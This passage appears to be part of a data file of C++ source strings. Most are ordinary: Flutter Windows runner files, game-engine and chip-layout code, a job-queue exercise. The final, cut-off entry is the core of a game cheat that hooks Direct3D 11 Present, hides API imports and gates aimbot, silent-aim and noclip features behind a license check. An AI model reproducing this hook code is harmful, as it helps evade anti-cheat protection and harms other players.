spawnWaiterThread(clientSocket);\n        }\n    } catch (string e) {\n        util::log('E', \"That port is currently bound to another process.\");\n        exit(1);\n    }\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"promina_angency_task\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"UnionAfx.h\"\n\nnamespace Gothic_II_Addon {\n#ifdef __OCS_MANAGER_H__VER3__\n  zCClassDef* oCCSManager::classDef                 = (zCClassDef*)0x008C1DA8;\n#endif\n#ifdef __OCS_PLAYER_H__VER3__\n  zCClassDef* oCCSPlayer::classDef                  = (zCClassDef*)0x008C1F90;\n#endif\n#ifdef __OCS_PROPS_H__VER3__\n  zCClassDef* oCCSProps::classDef                   = (zCClassDef*)0x008C2030;\n#endif\n#ifdef __OCS_TRIGGER_H__VER3__\n  zCClassDef* oCCSTrigger::classDef                 = (zCClassDef*)0x008C20A8;\n#endif\n#ifdef __ZCCS_CONTEXT_H__VER3__\n  zCClassDef* zCCSCutsceneContext::classDef         = (zCClassDef*)0x008C2120;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER3__\n  zCClassDef* zCEvMsgCutscene::classDef             = (zCClassDef*)0x008C2190;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER3__\n  zCClassDef* zCCSBlock::classDef                   = (zCClassDef*)0x008C2208;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER3__\n  zCClassDef* zCCSSyncBlock::classDef               = (zCClassDef*)0x008C2278;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER3__\n  zCClassDef* zCCSAtomicBlock::classDef             = (zCClassDef*)0x008C22E8;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER3__\n  zCClassDef* zCCutscene::classDef                  = (zCClassDef*)0x008C2358;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER3__\n  zCClassDef* zCCSBlockBase::classDef               = (zCClassDef*)0x008C2418;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER3__\n  zCClassDef* zCCSRole::classDef                    = (zCClassDef*)0x008C2488;\n#endif\n#ifdef __ZCCS_LIB_H__VER3__\n  zCClassDef* zCCSLib::classDef                     = (zCClassDef*)0x008C2500;\n#endif\n#ifdef __ZCCS_MANAGER_H__VER3__\n  zCClassDef* zCCSManager::classDef                 = (zCClassDef*)0x008C2588;\n#endif\n#ifdef __ZCCS_PLAYER_H__VER3__\n  zCClassDef* zCCSPlayer::classDef                  = (zCClassDef*)0x008C2608;\n#endif\n#ifdef __ZCCS_POOL_H__VER3__\n  zCClassDef* zCCSPoolItem::classDef                = (zCClassDef*)0x008C2680;\n#endif\n#ifdef __ZCCS_PROPS_H__VER3__\n  zCClassDef* zCCSProps::classDef                   = (zCClassDef*)0x008C26F8;\n#endif\n#ifdef __OSAVEGAME_H__VER3__\n  zCClassDef* oCSavegameInfo::classDef              = (zCClassDef*)0x008C2D48;\n#endif\n#ifdef __OTRIGGER_H__VER3__\n  zCClassDef* oCTriggerScript::classDef             = (zCClassDef*)0x008C2E48;\n#endif\n#ifdef __OTRIGGER_H__VER3__\n  zCClassDef* oCTriggerChangeLevel::classDef        = (zCClassDef*)0x008C2F40;\n#endif\n#ifdef __ZNET_EVENT_MAN_H__VER3__\n  zCClassDef* zCNetEventManager::classDef           = (zCClassDef*)0x008CD0E0;\n#endif\n#ifdef __ZNET_MANAGER_H__VER3__\n  zCClassDef* zCNetManager::classDef                = (zCClassDef*)0x008CD1D0;\n#endif\n#ifdef __ZNET_VOB_CONTROL_H__VER3__\n  zCClassDef* zCNetVobControl::classDef             = (zCClassDef*)0x008CD2E8;\n#endif\n#ifdef __OSPELL_H__VER3__\n  zCClassDef* oCSpell::classDef                     = (zCClassDef*)0x008CE520;\n#endif\n#ifdef __OVIS_FX_H__VER3__\n  zCClassDef* oCVisualFX::classDef                  = (zCClassDef*)0x008CE658;\n#endif\n#ifdef __OVIS_FX__MULTI_TARGET_H__VER3__\n  zCClassDef* oCVisFX_MultiTarget::classDef         = (zCClassDef*)0x008CE7F8;\n#endif\n#ifdef __ZAI_CAMERA_H__VER3__\n  zCClassDef* zCAICamera::classDef                  = (zCClassDef*)0x008CE950;\n#endif\n#ifdef __ZCS_CAMERA_H__VER3__\n  zCClassDef* zCCSCamera_EventMsg::classDef         = (zCClassDef*)0x008D0F38;\n#endif\n#ifdef __ZCS_CAMERA_H__VER3__\n  zCClassDef* zCCSCamera::classDef                  = (zCClassDef*)0x008D0FB8;\n#endif\n#ifdef __ZCS_CAMERA_H__VER3__\n  zCClassDef* zCCamTrj_KeyFrame::classDef           = (zCClassDef*)0x008D1028;\n#endif\n#ifdef __ZCS_CAMERA_H__VER3__\n  zCClassDef* zCCSCamera_EventMsgActivate::classDef = (zCClassDef*)0x008D1098;\n#endif\n#ifdef __ZAI_H__VER3__\n  zCClassDef* zCAIBase::classDef                    = (zCClassDef*)0x008D43C8;\n#endif\n#ifdef __ZAI_H__VER3__\n  zCClassDef* zCAIBaseSound::classDef               = (zCClassDef*)0x008D4438;\n#endif\n#ifdef __ZAI_PLAYER_H__VER3__\n  zCClassDef* zCAIPlayer::classDef                  = (zCClassDef*)0x008D4538;\n#endif\n#ifdef __ZARCHIVER_H__VER3__\n  zCClassDef* zCArchiver::classDef                  = (zCClassDef*)0x008D4658;\n#endif\n#ifdef __ZARCHIVER2_H__VER3__\n  zCClassDef* zCArchiverBinSafe::classDef           = (zCClassDef*)0x008D47B8;\n#endif\n#ifdef __ZARCHIVER_GENERIC_H__VER3__\n  zCClassDef* zCArchiverGeneric::classDef           = (zCClassDef*)0x008D48B0;\n#endif\n#ifdef __ZVISUAL_H__VER3__\n  zCClassDef* zCDecal::classDef                     = (zCClassDef*)0x008D84B0;\n#endif\n#ifdef __ZLENSFLARE_H__VER3__\n  zCClassDef* zCLensFlareFX::classDef               = (zCClassDef*)0x008D85F8;\n#endif\n#ifdef __ZMATERIAL_H__VER3__\n  zCClassDef* zCMaterial::classDef                  = (zCClassDef*)0x008D8708;\n#endif\n#ifdef __ZVISUAL_H__VER3__\n  zCClassDef* zCMesh::classDef                      = (zCClassDef*)0x008D87C8;\n#endif\n#ifdef __ZMODEL_H__VER3__\n  zCClassDef* zCModelAni::classDef                  = (zCClassDef*)0x008D8898;\n#endif\n#ifdef __ZMODEL_H__VER3__\n  zCClassDef* zCModel::classDef    ",
    "#include <cmath>\n#include <unordered_set>\n#include \"globalPhaseAdapter.h\"\n#include \"rectangle.h\"\n#include \"cSException.h\"\n\n\nglobalPhaseAdapter::globalPhaseAdapter(std::string fileName){\n    this->ifs.open(fileName);\n    if(!this->ifs.is_open()){\n        throw CSException(\"GLOBALPHASEADAPTER_02\");\n    }\n}\n\nglobalPhaseAdapter::~globalPhaseAdapter(){\n    this->ifs.close();\n}\n\nvoid globalPhaseAdapter::readGlobalResult() {\n    int blockNum = 0;\n    std::string tword;\n    int tnum;\n\n    ifs >> tword >> this->totalTesseraeNum >> tword >> this->totalConnNum;\n    ifs >> chipWidth >> chipHeight;\n    \n    std::cout << this->totalTesseraeNum << \", \" << this->totalConnNum << std::endl;\n    std::cout << this->chipWidth << \", \" << this->chipHeight << std::endl;\n    for (int i = 0; i < this->totalTesseraeNum; i++)\n    {\n        std::string storeName;\n        double initX, initY;\n        len_t initW, initH;\n\n        ifs >> storeName >> tword >> initX >> initY >> initW >> initH;\n        initX = round(initX);\n        initY = round(initY);\n\n        Tessera *nT = new Tessera();\n        nT->name = storeName;\n        Rectangle initBox (len_t(initX), len_t(initY), len_t(initX)+initW, len_t(initY)+initH);\n\n        nT->origBox = initBox;\n        nT->TileArr.push_back(new Tile(tileType::BLOCK, initBox));\n        \n        if(tword == \"SOFT\"){\n            nT->type = tesseraType::SOFT;\n            this->softTesserae.push_back(nT);\n        }else if(tword == \"FIXED\"){\n            nT->type = tesseraType::HARD;\n            this->fixedTesserae.push_back(nT);\n        }else{\n            throw CSException(\"GLOBALPHASEADAPTER_02\");\n}\n\n    }\n\n}\n\n// If an overlap is detected, You should:\n// 1. Locate the overlap and crate a new Tile marking the overlap, \n//  the tile should include the spacing info and the overlap Tessera idx\n//  Tile *overlapTile = new Tile(tileType::OVERLAP, Cord(1,3), 4, 5);\n//  overlapTile->OverlapFixedTesseraeIdx.pushback()....\n//  overlapTile->OverlapSoftTesseraeIdx.pushback()....\n\n// 2. Split (both) the Tesserae into smaller tiles if it become rectlinear.\n// 3. Update (both) the Tesserae's tile list.\nvoid globalPhaseAdapter::detectGlobalOverlaps(){\n    using namespace boost::polygon::operators;\n    namespace gtl = boost::polygon;\n\n    gtl::connectivity_extraction_90<len_t> ce;\n\n    typedef gtl::polygon_90_set_data <len_t> PolygonSet;\n\n    std::vector<Rectangle> test_data;\n    for ( const Tessera *curTes : this->softTesserae ) {\n        test_data.push_back(curTes->origBox);\n    }\n    for ( const Tessera *curTes : this->fixedTesserae ) {\n        test_data.push_back(curTes->origBox);\n    }\n\n    for ( unsigned int i = 0; i < test_data.size(); ++i ) {\n        //insert returns an id starting at zero and incrementing\n        //with each call\n        assert(ce.insert(test_data[i]) == i);\n    }\n    //notice that ids returned by ce.insert happen to match\n    //index into vector of inputs in this case\n\n    //make sure the vector graph has elements for our nodes\n    std::vector< std::set<len_t> > graph(test_data.size());\n\n    //populate the graph with edge data\n    ce.extract(graph);\n\n    struct IntersectionUnit\n    {\n        Rectangle intersection;\n        std::vector<int> overlappedIDs;\n    };\n\n    // 2 overlapped\n    std::vector<IntersectionUnit> overlap2unit;\n    for ( int i = 0; i < test_data.size(); i++ ) {\n        for ( int n : graph[i] ) {\n            if ( n < i ) {\n                continue;\n            }\n            PolygonSet intersections;\n            // gtl::polygon_90_set_data <len_t> intersections;\n            intersections += test_data[i] & test_data[n];\n            if ( intersections.empty() ) {\n                continue;\n            }\n            Rectangle intersectBox;\n            gtl::extents(intersectBox, intersections);\n            IntersectionUnit iu;\n            iu.intersection = intersectBox;\n            iu.overlappedIDs.push_back(i);\n            iu.overlappedIDs.push_back(n);\n            overlap2unit.push_back(iu);\n        }\n    }\n\n    // 3 overlapped\n    std::vector<IntersectionUnit> overlap3unit;\n    for ( IntersectionUnit &o2unit: overlap2unit ) {\n        int olID0 = o2unit.overlappedIDs[0], olID1 = o2unit.overlappedIDs[1];\n        for ( int n : graph[olID1] ) {\n            if ( n <= olID1 ) {\n                continue;\n            }\n            PolygonSet intersections;\n            intersections += o2unit.intersection & test_data[n];\n            if ( intersections.empty() ) {\n                continue;\n            }\n            printf(\"%2d %2d %2d\\n\", olID0, olID1, n);\n            // std::cout << \"3 Modules Intersection: \" << intersections << std::endl;\n            Rectangle intersectBox;\n            gtl::extents(intersectBox, intersections);\n            IntersectionUnit iu;\n            iu.intersection = intersectBox;\n            iu.overlappedIDs.push_back(olID0);\n            iu.overlappedIDs.push_back(olID1);\n            iu.overlappedIDs.push_back(n);\n            overlap3unit.push_back(iu);\n        }\n    }\n\n ",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"MovingPlatform.h\"\n\n// Sets default values\nAMovingPlatform::AMovingPlatform()\n{\n \t// Set this actor to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = true;\n\n}\n\n// Called when the game starts or when spawned\nvoid AMovingPlatform::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n\tStartLocation = GetActorLocation();\n\n\tFString Name = GetName();\n\n\tUE_LOG(LogTemp, Display, TEXT(\"BeginPlay: %s\"), *Name);\n}\n\nvoid AMovingPlatform::Unpause()\n{\n\tisPaused = false;\n}\n\n// Called every frame\nvoid AMovingPlatform::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\tif (!isPaused)\n\t{\n\t\tMovePlatform(DeltaTime);\n\t}\n\tRotatePlatform(DeltaTime);\n}\n\nvoid AMovingPlatform::MovePlatform(float DeltaTime)\n{\n\tif (ShouldPlatformReturn())\n\t{\n\t\tisPaused = true;\n\t\tFVector MoveDirection = PlatformVelocity.GetSafeNormal();\n\t\tStartLocation = StartLocation + MoveDirection * MoveDistance;\n\t\tSetActorLocation(StartLocation);\n\t\tFTimerHandle UniqueHandle;\n\t\tFTimerDelegate RespawnDelegate = FTimerDelegate::CreateUObject(this, &AMovingPlatform::Unpause);\n\t\tGetWorldTimerManager().SetTimer(UniqueHandle, RespawnDelegate, 2, false);\n\t\tPlatformVelocity = -PlatformVelocity;\n\t}\n\telse\n\t{\n\t\tFVector CurrentLocation = GetActorLocation();\n\t\tCurrentLocation = CurrentLocation + (PlatformVelocity * DeltaTime);\n\t\tSetActorLocation(CurrentLocation);\n\t}\n}\n\nvoid AMovingPlatform::RotatePlatform(float DeltaTime)\n{\n\tFRotator CurrentRotation = GetActorRotation();\n\tCurrentRotation = CurrentRotation + RotationVelocity * DeltaTime;\n\tSetActorRotation(CurrentRotation);\n}\n\nbool AMovingPlatform::ShouldPlatformReturn() const\n{\n\treturn GetDistanceMoved() > MoveDistance;\n}\n\nfloat AMovingPlatform::GetDistanceMoved() const\n{\n\treturn FVector::Dist(StartLocation, GetActorLocation());\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*Queues are frequently used in computer programming, and a typical example is the\ncreation of a job queue by an operating system. If the operating system does not use\npriorities, then the jobs are processed in the order they enter the system. Write C++\nprogram for simulating job queue. Write functions to add job and delete job from queue.*/\n\n#include <iostream>\nusing namespace std;\n\nclass JobQueue\n{\npublic:\n    const static int maxSize = 10;\n    int rear = -1;\n    int front = -1;\n    int size;\n    int jobList[maxSize];\n\n    void addJob(int jobNumber)\n    {\n        if (rear == maxSize - 1)\n        {\n            cout << \"Overflow!!!\";\n        }\n        else if (front == -1 && rear == -1)\n        {\n            front = rear = 0;\n            jobList[rear] = jobNumber;\n        }\n        else\n        {\n            rear++;\n            jobList[rear] = jobNumber;\n        }\n    }\n\n    void deleteJob()\n    {\n        if (front == -1 && rear == -1)\n        {\n            cout << \"Underflow!!! [Queue is Empty]\" << endl;\n        }\n        else if (front == rear)\n        {\n            front = rear = -1;\n        }\n        else\n        {\n            cout << jobList[front] << endl;\n            front = (front + 1) % maxSize;\n        }\n    }\n\n    void displayQueue()\n    {\n        if (front == -1 && rear == -1)\n        {\n            cout << \"Queue is Empty!\" << endl;\n        }\n        else\n        {\n            cout << \"Queue Contains:\";\n            for (int i = front; i <= rear; i++)\n            {\n                cout << jobList[i] << \" \";\n            }\n            cout << endl;\n        }\n    }\n};\n\nint main()\n{\n    JobQueue jobQueue;\n    int userChoice, jobNumber;\n\n    do\n    {\n        cout << \"Enter choice from options given below\" << endl;\n        cout << \"Note: (Job number should be in integer type)\" << endl;\n        cout << \"1. To Add Job\" << endl;\n        cout << \"2. To Delete Job\" << endl;\n        cout << \"3. To Display Queue\" << endl;\n        cout << \"4. Exit\" << endl;\n        cin >> userChoice;\n\n        switch (userChoice)\n        {\n        case 1:\n            cout << \"Enter Job Number:\" << endl;\n            cin >> jobNumber;\n            jobQueue.addJob(jobNumber);\n            break;\n        case 2:\n            cout << \"The Deleted Job Number:\";\n            jobQueue.deleteJob();\n            break;\n        case 3:\n            jobQueue.displayQueue();\n            break;\n        case 4:\n            break;\n        default:\n            cout << \"Enter valid option:\";\n            break;\n        }\n    } while (userChoice != 4);\n\n    return 0;\n}\n\n",
    "#include \"utils.h\"\r\n\r\n#include <flutter_windows.h>\r\n#include <io.h>\r\n#include <stdio.h>\r\n#include <windows.h>\r\n\r\n#include <iostream>\r\n\r\nvoid CreateAndAttachConsole() {\r\n  if (::AllocConsole()) {\r\n    FILE *unused;\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\r\n      _dup2(_fileno(stdout), 1);\r\n    }\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\r\n      _dup2(_fileno(stdout), 2);\r\n    }\r\n    std::ios::sync_with_stdio();\r\n    FlutterDesktopResyncOutputStreams();\r\n  }\r\n}\r\n\r\nstd::vector<std::string> GetCommandLineArguments() {\r\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\r\n  int argc;\r\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\r\n  if (argv == nullptr) {\r\n    return std::vector<std::string>();\r\n  }\r\n\r\n  std::vector<std::string> command_line_arguments;\r\n\r\n  // Skip the first argument as it's the binary name.\r\n  for (int i = 1; i < argc; i++) {\r\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\r\n  }\r\n\r\n  ::LocalFree(argv);\r\n\r\n  return command_line_arguments;\r\n}\r\n\r\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\r\n  if (utf16_string == nullptr) {\r\n    return std::string();\r\n  }\r\n  int target_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      -1, nullptr, 0, nullptr, nullptr)\r\n    -1; // remove the trailing null character\r\n  int input_length = (int)wcslen(utf16_string);\r\n  std::string utf8_string;\r\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\r\n    return utf8_string;\r\n  }\r\n  utf8_string.resize(target_length);\r\n  int converted_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\r\n  if (converted_length == 0) {\r\n    return std::string();\r\n  }\r\n  return utf8_string;\r\n}\r\n",
    "#include \"Core.hpp\"\r\n\r\n#include \"d3d_Hook.hpp\"\r\n#include \"Menu.hpp\"\r\n#include \"Classes.hpp\"\r\n#include \"Settings.hpp\"\r\n#include \"Visuals.hpp\"\r\n#include \"Player.hpp\"\r\n#include \"Aimbot.hpp\"\r\n#include \"Weapon.hpp\"\r\n#include \"NoClip.hpp\"\r\n#include \"vehicule.hpp\"\r\n#include \"auth.hpp\"\r\n#include \"Fonts.hpp\"\r\n#include <imguinotify.hpp>\r\n#include <program.hpp>\r\n\r\n#pragma comment(lib, \"proxine.lib\")\r\n\r\n//#include \"Snow.hpp\"\r\nextern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\r\n// you need those for snowflake\r\n#define WINDOW_WIDTH  1920\r\n#define WINDOW_HEIGHT 1080\r\nbool IsValid = false;\r\n\r\nvoid Kouloumbou()\r\n{\r\n\tstd::exit(-1);\r\n}\r\nvoid InitImGui()\r\n{\r\n\tusing namespace DirectX;\r\n\r\n\tImGui::CreateContext();\r\n\r\n\tImGuiIO* io = &ImGui::GetIO();\r\n\tio->ConfigFlags = ImGuiConfigFlags_NoMouseCursorChange;\r\n\tio->IniFilename = nullptr;\r\n\tio->LogFilename = nullptr;\r\n\r\n\tstatic const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_FA, 0 };\r\n\tImFontConfig icons_config;\r\n\r\n\ticons_config.MergeMode = true;\r\n\ticons_config.PixelSnapH = true;\r\n\t\r\n\tImFontConfig rubik;\r\n\trubik.FontDataOwnedByAtlas = false;\r\n\t\r\n\r\n\tio->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 15.5f, &rubik);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tMenu::BiggestIcon = io->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 40.f, NULL, icons_ranges);\r\n\tMenu::BiggestFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 21.f, &rubik);\r\n\tMenu::littleFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 17.5f, &rubik);\r\n\r\n\tImGui_ImplWin32_Init(Window);\r\n\tImGui_ImplDX11_Init(pDevice, pContext);\r\n\t\r\n\t//Snowflake::CreateSnowFlakes(snow, SNOW_LIMIT, 5.f/*minimum size*/, 25.f/*maximum size*/, 0/*imgui window x position*/, 0/*imgui window y position*/, WINDOW_WIDTH, WINDOW_HEIGHT, Snowflake::vec3(0.f, 0.005f)/*gravity*/, IM_COL32(255,255, 255, 100)/*color*/);\r\n\r\n}\r\n\r\n\r\nLRESULT __stdcall WindowHandler(const HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)\r\n{\r\n\tif (Menu::Open)\r\n\t{\r\n\t\tImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn SAFE_CALL(CallWindowProcA)(DirectX::WindowEx, hWnd, uMsg, wParam, lParam);\r\n}\r\n\r\n\r\nbool BindD3DInfo(IDXGISwapChain* pSwapChain)\r\n{\r\n\tif (SUCCEEDED(pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&DirectX::pDevice)))\r\n\t{\r\n\t\tDirectX::pDevice->GetImmediateContext(&DirectX::pContext);\r\n\t\tDXGI_SWAP_CHAIN_DESC sd;\r\n\r\n\t\tpSwapChain->GetDesc(&sd);\r\n\t\tDirectX::Window = sd.OutputWindow;\r\n\t\t\r\n\t\r\n\t\tID3D11Texture2D* pBackBuffer;\r\n\r\n\t\tpSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&pBackBuffer);\r\n\t\tDirectX::pDevice->CreateRenderTargetView(pBackBuffer, 0, &DirectX::renderTargetView);\r\n\t\tpBackBuffer->Release();\r\n\r\n\t\tDirectX::WindowEx = (WNDPROC)LI_FN(SetWindowLongPtrA).safe_cached()(DirectX::Window, GWLP_WNDPROC, (LONG_PTR)WindowHandler);\r\n\r\n\t\tInitImGui();\r\n\r\n\t\tMenu::FirstTime = false;\r\n\r\n\t\tMenu::Style();\r\n\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn false;\r\n}\r\nbool AuthConnected = false;\r\n\r\nchar Licence[50] = \"\";\r\nchar UserName[20] = \"\";\r\nchar RgPassWord[20] = \"\";\r\nchar RgUserName[20] = \"\";\r\nstatic int Tabs = 2;\r\nstatic int Checks = 0;\r\nHRESULT __stdcall PresentHook(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags)\r\n{\r\n\tif (Menu::FirstTime)\r\n\t{\r\n\r\n\t\tif (!BindD3DInfo(pSwapChain))\r\n\t\t\treturn DirectX::OriginalPresent(pSwapChain, SyncInterval, Flags);\r\n\t}\r\n\r\n\tImGui_ImplDX11_NewFrame();\r\n\tImGui_ImplWin32_NewFrame();\r\n\tImGui::NewFrame();\r\n\r\n\tif (SAFE_CALL(GetAsyncKeyState)(VK_INSERT) & 1)\r\n\t{\r\n\r\n\t\tMenu::Open = !Menu::Open;\r\n\t}\r\n\tif (SAFE_CALL(GetAsyncKeyState)(0x58) & 1)\r\n\t{\r\n\t\tSettings::Player::NoClip = !Settings::Player::NoClip;\r\n\t}\r\n\tImGui::GetIO().MouseDrawCursor = Menu::Open;\r\n\tImGui::GetIO().WantCaptureKeyboard = Menu::Open;\r\n\tif (AuthConnected)\r\n\t{\r\n\t\t\r\n\r\n\t\tVisuals::Hook();\r\n\t\tPlayers::Hook();\r\n\t\tif (!Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\r\n\t\t}\r\n\t\tif (Settings::Aimbot::silentaim && Settings::Aimbot::aimmousewhilesilent)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\t\t}\r\n\t\tif (Settings::Aimbot::Aimbot && 